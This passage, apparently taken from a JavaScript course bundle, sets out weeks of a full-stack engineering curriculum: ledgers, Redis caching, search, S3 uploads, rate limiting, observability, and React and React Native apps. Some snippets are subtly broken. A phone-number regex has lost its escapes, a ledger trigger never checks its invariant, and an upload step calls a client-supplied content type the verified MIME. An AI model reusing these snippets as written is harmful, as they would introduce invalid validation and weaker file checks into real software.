);`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build the Full Notification Pipeline",steps:["Create 3 notification templates in DB: payment_received, file_shared, login_alert.","Build the notification dispatcher: given user_id + event_type + data, look up prefs and dispatch to channels.","Implement push via Firebase FCM (use test credentials). Send a real push to your phone.","Implement email via SMTP (use Mailtrap for testing). Verify HTML email renders correctly.","Test dedup: fire the same payment_received event twice with same payment_id → only 1 notification delivered.","Test quiet hours: set user quiet hours 23:00-07:00, trigger notification at 2 AM → must queue for 7 AM.",'Build a "Notification Center" API: GET /notifications?page=1 with read/unread status.']},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:"Smart Notification Batching",problem:'A user gets 50 new comments on their post in 10 minutes. Instead of 50 push notifications, they should get one: "50 new comments on your post".',solution:"Implement notification batching: when enqueueing, check if a similar notification is already pending (same user + same type + within 5 minute window). If yes, update the count and reschedule instead of creating a new notification. Use a scheduled_at field that gets pushed forward on each update."}]}]},h={id:4,title:"Payments, Caching & Search",subtitle:"Weeks 10-12 · The features users actually pay for",color:"#e74694",emoji:"💳",modules:[{id:10,title:"Double-Entry Ledger & Idempotent Transfers",week:"Week 10",goal:"Money never disappears. Build a financial ledger that survives crashes, retries, and concurrent transfers.",tags:["ACID","Double-Entry","Ledger","Locks","Idempotency"],content:[{type:"heading",text:"🗺 System Design: Why Double-Entry?"},{type:"para",text:"Single-entry: subtract from A, add to B. If anything crashes between, money vanishes. Double-entry: every debit has an equal credit in the same atomic transaction. If the sum of all ledger entries is not zero, something is wrong."},{type:"code",text:`-- Complete financial schema
CREATE TABLE accounts (
  id        UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id   UUID REFERENCES users(id),
  type      TEXT NOT NULL,         -- 'wallet', 'escrow', 'fee_pool'
  currency  TEXT NOT NULL DEFAULT 'INR',
  balance   NUMERIC(18,2) NOT NULL DEFAULT 0,
  version   INT NOT NULL DEFAULT 0,  -- optimistic locking
  frozen    BOOLEAN DEFAULT false,
  CONSTRAINT balance_non_negative CHECK (balance >= 0)
);

CREATE TABLE transactions (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  idempotency_key TEXT UNIQUE NOT NULL,
  from_account    UUID REFERENCES accounts(id),
  to_account      UUID REFERENCES accounts(id),
  amount          NUMERIC(18,2) NOT NULL,
  currency        TEXT NOT NULL,
  status          TEXT DEFAULT 'pending',  -- pending|completed|failed|reversed
  type            TEXT NOT NULL,           -- 'transfer', 'payment', 'refund', 'fee'
  description     TEXT,
  metadata        JSONB,
  completed_at    TIMESTAMPTZ,
  created_at      TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE ledger_entries (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  account_id      UUID REFERENCES accounts(id),
  transaction_id  UUID REFERENCES transactions(id),
  amount          NUMERIC(18,2) NOT NULL,  -- positive=credit, negative=debit
  balance_after   NUMERIC(18,2) NOT NULL,
  created_at      TIMESTAMPTZ DEFAULT now()
);

-- Invariant: sum(ledger_entries.amount) must always = 0
-- Create a trigger to verify this on every insert
CREATE OR REPLACE FUNCTION verify_ledger_balance()
RETURNS TRIGGER AS $$
DECLARE total NUMERIC;
BEGIN
  SELECT SUM(amount) INTO total FROM ledger_entries
  WHERE transaction_id = NEW.transaction_id;
  -- After both entries are created, total should be 0
  -- (handled at application level before commit)
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;`},{type:"code",text:`# Bulletproof transfer function
async def transfer(
    db: AsyncSession,
    from_id: UUID,
    to_id: UUID,
    amount: Decimal,
    idempotency_key: str,
    description: str
) -> Transaction:
    async with db.begin():
        # Step 1: Idempotency check
        existing = await db.scalar(
            select(Transaction).where(
                Transaction.idempotency_key == idempotency_key
            )
        )
        if existing:
            return existing

        # Step 2: Lock BOTH accounts in consistent order (prevent deadlock)
        # Always lock by lower UUID first — same order across all transactions
        ids = sorted([str(from_id), str(to_id)])
        accounts = {
            acc.id: acc for acc in await db.scalars(
                select(Account)
                .where(Account.id.in_([from_id, to_id]))
                .order_by(Account.id)
                .with_for_update()  # row-level lock
            )
        }

        from_acc = accounts[from_id]
        to_acc   = accounts[to_id]

        # Step 3: Validate
        if from_acc.frozen: raise AccountFrozenError(from_id)
        if to_acc.frozen:   raise AccountFrozenError(to_id)
        if from_acc.balance < amount: raise InsufficientFundsError(from_acc.balance, amount)

        # Step 4: Create transaction record
        txn = Transaction(
            idempotency_key=idempotency_key,
            from_account=from_id,
            to_account=to_id,
            amount=amount,
            status='completed',
            description=description
        )
        db.add(txn)
        await db.flush()  # get txn.id

        # Step 5: Create ledger entries (double-entry)
        from_after = from_acc.balance - amount
        to_after   = to_acc.balance   + amount

        db.add(LedgerEntry(
            account_id=from_id, transaction_id=txn.id,
            amount=-amount, balance_after=from_after
        ))
        db.add(LedgerEntry(
            account_id=to_id, transaction_id=txn.id,
            amount=+amount, balance_after=to_after
        ))

        # Step 6: Update balances
        from_acc.balance = from_after
        to_acc.balance   = to_after

        return txn  # committed when context manager exits`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Money Movement Gauntlet",steps:["Create 3 user accounts with initial balances via a seed script.","Build the transfer endpoint. Transfer money. Verify sum of all ledger entries = 0.","Write a database-level CHECK: sum of all ledger_entries per transaction_id must equal 0. Try to violate it.","Test: two concurrent transfers from the same account exceeding balance → exactly one succeeds with InsufficientFunds.","Test: crash after debit ledger entry but before credit (use a trigger to throw midway). Verify rollback restores balance.","Build GET /accounts/:id/statement — paginated ledger history with running balance.","Write a reconciliation job: daily cron that checks sum(ledger_entries) = 0 globally and alerts if not."]}]},{id:11,title:"Redis Caching: Patterns, Stampedes & Invalidation",week:"Week 11",goal:"Cache with precision. Know exactly when to cache, what to cache, and how to invalidate correctly.",tags:["Cache-Aside","Write-Through","Stampede","TTL","Lua Script"],content:[{type:"heading",text:"🗺 System Design: Caching Decision Tree"},{type:"bullets",items:["Q: Can data be slightly stale? → Yes → Cache-aside with TTL. No → Write-through or no cache.","Q: Is it written more than read? → Write-behind async or no caching.","Q: Is it user-specific? → Key includes user_id. Is it global? → Shared key.","Q: What breaks if cache is wrong? → if money → never cache balance. if profile → cache 60s is fine.","Golden rule: cache reads, not writes. Always have a path to the DB."]},{type:"code",text:`# Cache-aside with stampede prevention using Lua atomic lock
CACHE_LOCK_TTL = 5  # seconds

async def get_with_stampede_prevention(key: str, ttl: int, fetcher):
    # Try fast path first
    cached = await redis.get(key)
    if cached:
        return json.loads(cached)

    # Try to acquire the lock (SET NX = set if not exists)
    lock_key = f"{key}:lock"
    acquired = await redis.set(lock_key, '1', nx=True, ex=CACHE_LOCK_TTL)

    if acquired:
        try:
            # We got the lock — fetch from DB
            data = await fetcher()
            await redis.setex(key, ttl, json.dumps(data, default=str))
            return data
        finally:
            await redis.delete(lock_key)
    else:
        # Another process is fetching — wait briefly then read
        for _ in range(10):
            await asyncio.sleep(0.2)
            cached = await redis.get(key)
            if cached:
                return json.loads(cached)
        # If still no data, hit DB directly as fallback
        return await fetcher()

# Usage
user_profile = await get_with_stampede_prevention(
    key=f"v1:user:{user_id}:profile",
    ttl=300,
    fetcher=lambda: db.get(User, user_id)
)

# Cache invalidation on update
async def update_user_profile(user_id, updates):
    await db.execute(update(User).where(User.id == user_id).values(**updates))
    # Invalidate all related cache keys
    keys_to_delete = [
        f"v1:user:{user_id}:profile",
        f"v1:user:{user_id}:full",
        f"v1:feed:{user_id}:*",  # pattern delete needs SCAN
    ]
    await redis.delete(*keys_to_delete)`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Cache Layer Build",steps:["Implement cache-aside for GET /users/:id — measure p99 latency before and after with Locust.","Simulate a stampede: expire the key then send 500 concurrent requests. Count DB queries — should be exactly 1.","Implement the Lua lock stampede prevention. Repeat the test — verify still exactly 1 DB query.","Build a cache metrics endpoint: GET /internal/cache-stats — hit rate, key count, memory used.","Test cache invalidation: update profile, verify old value never served again, verify DB value matches.","Test Redis failure: stop Redis, verify app falls back to DB (slower but works), verify error metric increments."]}]},{id:12,title:"Full-Text Search, Filtering & Cursor Pagination",week:"Week 12",goal:"Search that actually works at scale. Pagination that doesn't break at page 10,000.",tags:["PostgreSQL FTS","tsvector","Cursor Pagination","Elasticsearch basics"],content:[{type:"heading",text:"🗺 System Design: When to Use What"},{type:"table",headers:["Solution","Best For","Limitation","Setup Effort"],rows:[["PostgreSQL FTS (tsvector)","Single-table search, moderate scale","No fuzzy match, no synonyms","Low — just SQL"],["pg_trgm extension","Fuzzy search, LIKE '%abc%' performance","Slower than FTS for exact","Low — just SQL"],["Elasticsearch","Multi-field, fuzzy, faceted, huge scale","Separate service, sync complexity","High"],["Meilisearch","Developer-friendly, typo-tolerant","Less mature, smaller ecosystem","Medium"],["Typesense","Fast, schema-on-read, good for autocomplete","Less community than ES","Medium"]]},{type:"code",text:`-- Full-text search setup
-- Add tsvector column with auto-update trigger
ALTER TABLE notes ADD COLUMN search_vector TSVECTOR;

UPDATE notes SET search_vector =
  setweight(to_tsvector('english', COALESCE(title, '')), 'A') ||
  setweight(to_tsvector('english', COALESCE(body, '')), 'B') ||
  setweight(to_tsvector('english', COALESCE(array_to_string(tags::text[], ' '), '')), 'C');

CREATE INDEX idx_notes_fts ON notes USING GIN(search_vector);

-- Query with ranking
SELECT
  id, title,
  ts_rank_cd(search_vector, query) AS rank,
  ts_headline('english', body, query, 'MaxWords=30, MinWords=15') AS excerpt
FROM notes,
     to_tsquery('english', 'payment:* & invoice:*') query
WHERE user_id = $1
  AND search_vector @@ query
  AND deleted_at IS NULL
ORDER BY rank DESC
LIMIT 20;

-- Cursor pagination (WAY faster than OFFSET for large tables)
-- First page:
SELECT * FROM notes
WHERE user_id = $1
ORDER BY created_at DESC, id DESC
LIMIT 20;

-- Next page (cursor = last row's created_at + id):
SELECT * FROM notes
WHERE user_id = $1
  AND (created_at, id) < ('2024-01-15 10:30:00', '550e8400-e29b-41d4-...')
ORDER BY created_at DESC, id DESC
LIMIT 20;

-- Encode cursor as base64 JSON
-- {"ts": "2024-01-15T10:30:00Z", "id": "550e8400..."}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build a Notes Search Engine",steps:["Add tsvector column to notes table. Write the auto-update trigger.","Build GET /notes/search?q=payment+invoice — returns ranked results with highlighted excerpts.","Add filters: ?created_after=2024-01-01&tags[]=work&tags[]=finance","Implement cursor pagination. Verify: page through 10,000 notes — last page is as fast as first page.",'Test: search for "paymnt" (typo) — add pg_trgm for fuzzy matching as a fallback.',"Measure: 100,000 notes, search for common word — EXPLAIN ANALYZE must show Index Scan, not Seq Scan."]}]}]},y={id:5,title:"Files, Rate Limiting & Observability",subtitle:"Weeks 13-15 · Production ops that separate juniors from seniors",color:"#ff5a1f",emoji:"🔭",modules:[{id:13,title:"File Storage, Uploads & Access Control",week:"Week 13",goal:"Secure file upload pipeline that scales without routing bytes through your server.",tags:["S3","Presigned URLs","MIME","ClamAV","CDN"],content:[{type:"heading",text:"🗺 System Design: Direct-to-Storage Upload"},{type:"bullets",items:["Naive approach: client → your server → S3. Your server becomes a bandwidth bottleneck.",'Correct approach: client asks your server for a presigned URL → client uploads directly to S3 → client tells server "done".',"Your server only handles metadata, not bytes. Can handle 10,000x more upload traffic.","Security model: presigned URL expires in 15 minutes. Even if leaked, useless afterwards.","Never use the user's filename as the storage key — generate a UUID to prevent path traversal."]},{type:"code",text:`-- File metadata schema
CREATE TABLE files (
  id             UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id        UUID REFERENCES users(id),
  folder_id      UUID,
  original_name  TEXT NOT NULL,        -- what the user called it
  storage_key    TEXT UNIQUE NOT NULL, -- UUID-based path in S3
  mime_type      TEXT,
  size_bytes     BIGINT,
  checksum       TEXT,                 -- SHA-256 of file content
  scan_status    TEXT DEFAULT 'pending', -- pending|clean|infected|error
  public         BOOLEAN DEFAULT false,
  shared_with    UUID[],               -- user_ids with read access
  expires_at     TIMESTAMPTZ,          -- auto-delete date
  deleted_at     TIMESTAMPTZ,          -- soft delete
  created_at     TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE file_access_log (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  file_id     UUID REFERENCES files(id),
  user_id     UUID,
  action      TEXT,     -- 'view', 'download', 'share', 'delete'
  ip_address  INET,
  created_at  TIMESTAMPTZ DEFAULT now()
);`},{type:"code",text:`# Complete upload flow
import boto3
from uuid import uuid4
import python_magic  # real MIME detection (not just file extension)

s3 = boto3.client('s3', region_name='ap-south-1')

@router.post('/files/upload-url')
async def get_upload_url(
    filename: str,
    content_type: str,
    size_bytes: int,
    user_id: UUID = Depends(get_current_user)
):
    # Validate content type whitelist
    ALLOWED_TYPES = {
        'image/jpeg', 'image/png', 'image/webp',
        'application/pdf', 'video/mp4'
    }
    if content_type not in ALLOWED_TYPES:
        raise HTTPException(415, "File type not allowed")

    # Enforce size limits
    MAX_SIZE = 50 * 1024 * 1024  # 50MB
    if size_bytes > MAX_SIZE:
        raise HTTPException(413, "File too large")

    # Generate storage key (never use user-provided filename)
    storage_key = f"uploads/{user_id}/{uuid4()}"

    # Create presigned URL (expires in 15 minutes)
    presigned = s3.generate_presigned_post(
        Bucket='my-app-files',
        Key=storage_key,
        Conditions=[
            ['content-length-range', 0, MAX_SIZE],
            {'Content-Type': content_type},
        ],
        ExpiresIn=900
    )

    # Create pending file record
    file_record = File(
        user_id=user_id,
        original_name=filename,
        storage_key=storage_key,
        scan_status='pending'
    )
    db.add(file_record)

    return {'upload_url': presigned, 'file_id': str(file_record.id)}

@router.post('/files/{file_id}/confirm')
async def confirm_upload(file_id: UUID, user_id: UUID = Depends(get_current_user)):
    file = await db.get(File, file_id)

    # Verify actual MIME from S3 object metadata (not client claim)
    obj = s3.get_object(Bucket='my-app-files', Key=file.storage_key)
    real_mime = obj['ContentType']
    file.mime_type = real_mime
    file.size_bytes = obj['ContentLength']

    # Enqueue virus scan
    scan_file.delay(str(file_id), file.storage_key)

    return {'status': 'processing', 'file_id': str(file_id)}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build Secure File Storage",steps:["Set up MinIO locally (S3-compatible) with docker-compose. Create a bucket.","Build the upload-url endpoint. Test with curl: get presigned URL, upload a file directly to MinIO.","Build the confirm endpoint. Verify the file metadata is stored correctly.","Test security: try to upload a .html file named .jpg — your MIME check must reject/quarantine it.","Try to access another user's file: GET /files/:other_user_file_id → must return 403.",'Build file sharing: POST /files/:id/share {user_id: "..."} — adds to shared_with array. Other user can now download.',"Build a thumbnail generation job: on image upload confirmation, generate a 200x200 thumbnail using Pillow."]}]},{id:14,title:"Rate Limiting: Token Bucket & Distributed Throttling",week:"Week 14",goal:"Protect every endpoint. Different limits for different users. Atomic and distributed.",tags:["Token Bucket","Sliding Window","Lua Script","Redis","Distributed"],content:[{type:"heading",text:"🗺 System Design: Rate Limiting Algorithms"},{type:"table",headers:["Algorithm","How It Works","Pros","Cons"],rows:[["Fixed Window","Count per time window (e.g., 100/min)","Simple","Burst at window boundary (200 requests in 2 seconds)"],["Sliding Window Log","Keep timestamps of each request","Accurate","High memory usage"],["Sliding Window Counter","Weighted combo of current + previous window","Low memory, accurate","Slightly approximate"],["Token Bucket","Tokens added at refill rate, consumed per request","Handles bursts","More complex"],["Leaky Bucket","Queue requests, process at fixed rate","Smooth output","Adds latency, drops at queue limit"]]},{type:"code",text:`-- Atomic token bucket implemented in Redis Lua (runs atomically, no race conditions)
local BUCKET_SCRIPT = [[
  local key       = KEYS[1]
  local capacity  = tonumber(ARGV[1])
  local refill    = tonumber(ARGV[2])   -- tokens per second
  local now       = tonumber(ARGV[3])   -- current time in milliseconds
  local cost      = tonumber(ARGV[4])   -- tokens needed for this request

  local data = redis.call("HMGET", key, "tokens", "last_refill")
  local tokens     = tonumber(data[1]) or capacity
  local last       = tonumber(data[2]) or now

  -- Calculate tokens gained since last request
  local elapsed    = math.max(0, (now - last) / 1000)
  local new_tokens = math.min(capacity, tokens + elapsed * refill)

  if new_tokens < cost then
    -- Throttled — return time until enough tokens available
    local wait = math.ceil((cost - new_tokens) / refill * 1000)
    return {0, wait}
  end

  -- Consume tokens
  redis.call("HMSET", key, "tokens", new_tokens - cost, "last_refill", now)
  redis.call("EXPIRE", key, 3600)
  return {1, 0}
]]

# Python usage
async def check_rate_limit(user_id: str, endpoint: str, cost: int = 1) -> tuple[bool, int]:
    config = get_rate_limit_config(endpoint, user_tier=get_user_tier(user_id))
    key = f"rl:{endpoint}:{user_id}"
    result = await redis.eval(
        BUCKET_SCRIPT, 1, key,
        config.capacity, config.refill_rate,
        int(time.time() * 1000), cost
    )
    allowed, wait_ms = result
    return bool(allowed), wait_ms`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Full Rate Limiting Implementation",steps:["Implement the token bucket Lua script. Test atomicity: 100 concurrent requests → exactly N succeed.","Build the rate limit middleware — applies BEFORE route handlers, adds X-RateLimit-* headers to ALL responses.","Configure per-endpoint limits: OTP (3/10min/phone), transfers (10/min/user), reads (120/min/user).","Test distributed scenario: run 2 FastAPI instances sharing same Redis — combined limit must still hold.","Build GET /admin/rate-limits/:user_id — shows current bucket state for a user across all endpoints.","Test recovery: after being throttled, wait for refill period, verify requests succeed again."]}]},{id:15,title:"Observability: Logs, Metrics & Distributed Traces",week:"Week 15",goal:"Know what your system is doing in production. Find problems before users report them.",tags:["Prometheus","Grafana","OpenTelemetry","structlog","Correlation ID"],content:[{type:"heading",text:"🗺 System Design: The 3 Pillars + The 4th"},{type:"table",headers:["Pillar","Question It Answers","Tool","When to Check"],rows:[["Logs","What happened and why?","structlog → Loki or ELK","Debugging a specific error"],["Metrics","How is the system performing?","Prometheus + Grafana","Dashboards, alerts, capacity"],["Traces","Where did my request spend time?","OpenTelemetry + Jaeger","Slow request investigation"],["Events","What changed in the system?","Audit log table","Compliance, debugging data changes"]]},{type:"code",text:`# Complete structured logging setup
import structlog
from uuid import uuid4
from fastapi import Request

# Configure structlog to output JSON
structlog.configure(
    processors=[
        structlog.contextvars.merge_contextvars,
        structlog.stdlib.add_log_level,
        structlog.stdlib.add_logger_name,
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer(),
    ]
)
log = structlog.get_logger()

# Middleware: attach correlation_id to every request
async def correlation_middleware(request: Request, call_next):
    correlation_id = request.headers.get('X-Correlation-ID') or str(uuid4())
    user_id = None  # will be set after auth middleware

    # Bind to structlog context (all subsequent logs in this request get this)
    structlog.contextvars.bind_contextvars(
        correlation_id=correlation_id,
        path=request.url.path,
        method=request.method,
    )

    start = time.time()
    response = await call_next(request)
    duration_ms = round((time.time() - start) * 1000, 2)

    log.info("request_completed",
        status_code=response.status_code,
        duration_ms=duration_ms,
        user_id=str(user_id) if user_id else None,
    )

    response.headers['X-Correlation-ID'] = correlation_id
    return response

# Prometheus metrics setup
from prometheus_client import Counter, Histogram, Gauge
import prometheus_client

REQUEST_COUNT   = Counter('http_requests_total', 'Total HTTP requests', ['method', 'path', 'status'])
REQUEST_LATENCY = Histogram('http_request_duration_ms', 'Request latency', ['method', 'path'])
DB_POOL_SIZE    = Gauge('db_pool_active_connections', 'Active DB connections')
QUEUE_DEPTH     = Gauge('celery_queue_depth', 'Pending Celery jobs')`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Full Observability Stack",steps:["Add structlog to FastAPI. Verify every request produces JSON logs with correlation_id.","Set up Prometheus + Grafana with docker-compose. Expose /metrics endpoint.","Create a Grafana dashboard with: request rate, p99 latency, error rate, DB pool, Redis memory.","Set an alert: if error rate > 1% for 5 minutes, log a critical message.","Instrument a slow endpoint with a Histogram timer. See it on the Grafana dashboard.","Simulate an incident: intentionally break the DB connection. See alerts fire. Use logs to diagnose. Use correlation_id to trace one request end-to-end."]}]}]},g={id:6,title:"React Web Frontend — Full App",subtitle:"Weeks 16-18 · Build the complete web UI from scratch",color:"#0ea5e9",emoji:"⚛️",modules:[{id:16,title:"React Architecture & State Management",week:"Week 16",goal:"Build a scalable React app architecture that can grow from 1 to 100 components without becoming a mess.",tags:["React","Zustand","React Query","Component Design","Custom Hooks"],content:[{type:"heading",text:"🗺 System Design: Frontend Architecture Layers"},{type:"bullets",items:["Layer 1 — API Layer: axios/fetch wrappers + React Query for cache, loading states, retries","Layer 2 — State Layer: Zustand for global client state (auth, settings, theme)","Layer 3 — Component Layer: UI components, no business logic, only props + callbacks","Layer 4 — Page Layer: composes components, owns route-level data fetching","Folder structure: /features/auth, /features/notes, /features/payments — feature-first not type-first"]},{type:"code",text:`// src/lib/api.ts — centralized API client
import axios from 'axios';
import { useAuthStore } from '@/stores/auth';

export const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  timeout: 10000,
});

// Request interceptor: attach access token
api.interceptors.request.use((config) => {
  const token = useAuthStore.getState().accessToken;
  if (token) config.headers.Authorization = \`Bearer \${token}\`;
  return config;
});

// Response interceptor: auto-refresh on 401
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;
    if (error.response?.status === 401 && !original._retry) {
      original._retry = true;
      try {
        const { data } = await axios.post('/auth/refresh', {
          refresh_token: useAuthStore.getState().refreshToken,
        });
        useAuthStore.getState().setTokens(data.access_token, data.refresh_token);
        return api(original);
      } catch {
        useAuthStore.getState().logout();
        window.location.href = '/login';
      }
    }
    return Promise.reject(error);
  }
);

// src/stores/auth.ts — Zustand store
import { create } from 'zustand';
import { persist } from 'zustand/middleware';

interface AuthState {
  user: User | null;
  accessToken: string | null;
  refreshToken: string | null;
  setTokens: (access: string, refresh: string) => void;
  setUser: (user: User) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>()(
  persist(
    (set) => ({
      user: null,
      accessToken: null,
      refreshToken: null,
      setTokens: (access, refresh) =>
        set({ accessToken: access, refreshToken: refresh }),
      setUser: (user) => set({ user }),
      logout: () => set({ user: null, accessToken: null, refreshToken: null }),
    }),
    { name: 'auth-storage' } // persists to localStorage
  )
);`},{type:"heading",text:"⚙️ React Query Patterns"},{type:"code",text:`// src/features/notes/hooks/useNotes.ts
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { api } from '@/lib/api';

// Query key factory — keeps keys consistent across the app
export const noteKeys = {
  all: ['notes'] as const,
  lists: () => [...noteKeys.all, 'list'] as const,
  list: (filters: NoteFilters) => [...noteKeys.lists(), filters] as const,
  detail: (id: string) => [...noteKeys.all, 'detail', id] as const,
};

export function useNotes(filters: NoteFilters) {
  return useQuery({
    queryKey: noteKeys.list(filters),
    queryFn: () => api.get('/v1/notes', { params: filters }).then(r => r.data),
    staleTime: 1000 * 60,    // data fresh for 1 minute
    gcTime: 1000 * 60 * 5,   // keep in cache for 5 minutes
  });
}

export function useCreateNote() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: (note: NoteCreate) => api.post('/v1/notes', note),
    // Optimistic update — update UI before server confirms
    onMutate: async (newNote) => {
      await queryClient.cancelQueries({ queryKey: noteKeys.lists() });
      const previous = queryClient.getQueryData(noteKeys.lists());
      queryClient.setQueryData(noteKeys.lists(), (old: Note[]) => [
        { ...newNote, id: 'temp-' + Date.now(), created_at: new Date() },
        ...old
      ]);
      return { previous };
    },
    onError: (_err, _vars, context) => {
      queryClient.setQueryData(noteKeys.lists(), context?.previous);
    },
    onSettled: () => {
      queryClient.invalidateQueries({ queryKey: noteKeys.lists() });
    },
  });
}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Build the Full React Frontend",steps:["Set up Vite + React + TypeScript. Configure path aliases (@/). Install React Query + Zustand.","Build the API client with token interceptor + auto-refresh logic. Test: let token expire, make a request, verify it auto-refreshes.","Build the auth flow: Login page (phone + OTP), token storage, protected routes.","Build the Notes CRUD UI: list, create, edit, delete. All changes optimistic — UI updates before server responds.","Add real-time updates: connect WebSocket on app load. When server pushes note_updated event, update the React Query cache.","Build the Notification Center: bell icon with unread count badge, dropdown with notification list."]},{type:"heading",text:"🎨 Creative Challenge"},{type:"scenario",title:"Offline UI Mode",problem:"User is on a plane with no internet. They create 3 notes. When they land, the notes should sync automatically.",solution:"Use react-query + localStorage as a pending queue. Detect online/offline via navigator.onLine + window events. Queue mutations when offline. When online event fires, flush the queue in order and sync."}]},{id:17,title:"React UI: Forms, Tables, Charts & Search",week:"Week 17",goal:"Build professional-grade data-heavy UI components you'll use in every real project.",tags:["React Hook Form","Zod","Virtual Lists","Recharts","Debounce"],content:[{type:"heading",text:"🗺 System Design: Form Architecture"},{type:"code",text:`// Complete form with validation, submission, and error handling
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const transferSchema = z.object({
  amount: z.number()
    .min(1, 'Minimum transfer is ₹1')
    .max(100000, 'Maximum transfer is ₹1,00,000'),
  recipient_phone: z.string()
    .regex(/^+[1-9]d{9,14}$/, 'Invalid phone number'),
  note: z.string().max(200, 'Note too long').optional(),
  idempotency_key: z.string().default(() => crypto.randomUUID()),
});

type TransferForm = z.infer<typeof transferSchema>;

export function TransferMoney() {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<TransferForm>({
    resolver: zodResolver(transferSchema),
  });
  const createTransfer = useCreateTransfer();

  const onSubmit = async (data: TransferForm) => {
    try {
      await createTransfer.mutateAsync(data);
      toast.success('Transfer successful!');
    } catch (err: any) {
      toast.error(err.response?.data?.detail || 'Transfer failed');
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('amount', { valueAsNumber: true })} type="number" />
      {errors.amount && <span>{errors.amount.message}</span>}
      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Sending...' : 'Send Money'}
      </button>
    </form>
  );
}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Data-Rich UI Components",steps:["Build a transaction list with virtual scrolling (react-virtual) — 10,000 rows, no lag.","Build a search input with 300ms debounce — only hits API after user stops typing.","Build a line chart of account balance over time using Recharts.","Build an infinitely scrolling feed using useInfiniteQuery — loads next page when scrolling to bottom.","Build a data table with sortable columns, filterable rows, and CSV export.","Add keyboard shortcuts: Ctrl+N new note, Ctrl+F search, Escape close modal."]}]},{id:18,title:"React Native Mobile App",week:"Week 18",goal:"Build the mobile app sharing business logic with the web app. Handle device hardware, offline, and native UI.",tags:["Expo","React Navigation","Keychain","Background Sync","Push Notifications"],content:[{type:"heading",text:"🗺 System Design: Shared Logic Architecture"},{type:"bullets",items:["Share: API client, React Query hooks, Zustand stores, Zod schemas, utility functions","Don't share: UI components (platform-specific), native APIs, navigation structure","Use a monorepo (turborepo or nx): packages/shared → imported by apps/web and apps/mobile",'Platform detection: Platform.OS === "ios" | "android" | "web"']},{type:"code",text:`// Secure token storage — uses native Keychain (iOS) / Keystore (Android)
import * as SecureStore from 'expo-secure-store';

export const secureStorage = {
  set: async (key: string, value: string) => {
    await SecureStore.setItemAsync(key, value, {
      keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
    });
  },
  get: async (key: string) => {
    return await SecureStore.getItemAsync(key);
  },
  delete: async (key: string) => {
    await SecureStore.deleteItemAsync(key);
  },
};

// Replace localStorage-based Zustand persist with SecureStore
const secureStorageMiddleware: StateStorage = {
  getItem: async (name) => await secureStorage.get(name) ?? null,
  setItem: async (name, value) => await secureStorage.set(name, value),
  removeItem: async (name) => await secureStorage.delete(name),
};

// Push notification registration
import * as Notifications from 'expo-notifications';

export async function registerForPushNotifications(): Promise<string | null> {
  const { status } = await Notifications.requestPermissionsAsync();
  if (status !== 'granted') return null;

  const token = await Notifications.getExpoPushTokenAsync();
  // Send token to backend
  await api.post('/auth/devices/push-token', { token: token.data });
  return token.data;
}`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Mobile App Features",steps:["Set up Expo with TypeScript. Configure React Navigation (tab + stack).","Store tokens in SecureStore instead of localStorage. Test: reinstall app → token gone (no persistence).","Build OTP login screen with phone number input and 6-digit OTP input with auto-advance.","Register for push notifications on first login. Test: trigger a backend event → real push appears on device.","Build biometric authentication: on app resume, require Face ID/fingerprint using expo-local-authentication.","Implement background sync: use expo-background-fetch to sync offline operations every 15 minutes."]}]}]},f={id:7,title:"System Design Deep Dive",subtitle:"Weeks 19-21 · Think at scale before you need to scale",color:"#6b7280",emoji:"🏛️",modules:[{id:19,title:"Design WhatsApp / Real-Time Messaging",week:"Week 19",goal:"Design a messaging system for 100M users: delivery guarantees, encryption, media, group chats.",tags:["System Design","Fan-out","E2E Encryption","Message Queue","Presence"],content:[{type:"heading",text:"🎯 Requirements Gathering (Do This First)"},{type:"bullets",items:["Functional: 1-1 messaging, group chats (max 256 members), media (image/video/file), delivery receipts, read receipts, online presence","Non-functional: 100M DAU, messages delivered < 100ms p99, store messages for 5 years, no message loss, E2E encrypted","Scale estimate: 50 messages/user/day = 5B messages/day = 58K messages/second peak"]},{type:"heading",text:"🗺 High-Level Architecture"},{type:"bullets",items:["Client → WebSocket to a Chat Server (stateful, maintains connections)","Chat Server → publishes to Message Queue (Kafka) for durability","Message Queue → Fan-out Service reads and delivers to recipient WebSocket servers","If recipient offline → store in Message Store → deliver on reconnect (pull model)","Media → uploaded directly to S3, only URL stored in message","Groups → fan-out multiplied by group size. For large groups (>100 members), async fan-out via Kafka"]},{type:"table",headers:["Component","Technology Choice","Why","Alternative"],rows:[["Chat Server","Node.js / FastAPI WebSocket","High concurrency, async I/O","Elixir Phoenix"],["Message Queue","Apache Kafka","Durable, replayable, partitioned","Redis Streams (smaller scale)"],["Message Store","Cassandra / ScyllaDB","Write-heavy, time-series, distributed","DynamoDB, MongoDB"],["Presence Service","Redis (TTL keys + Pub/Sub)","In-memory speed, TTL for presence","Custom heartbeat DB"],["Media Storage","S3 + CloudFront 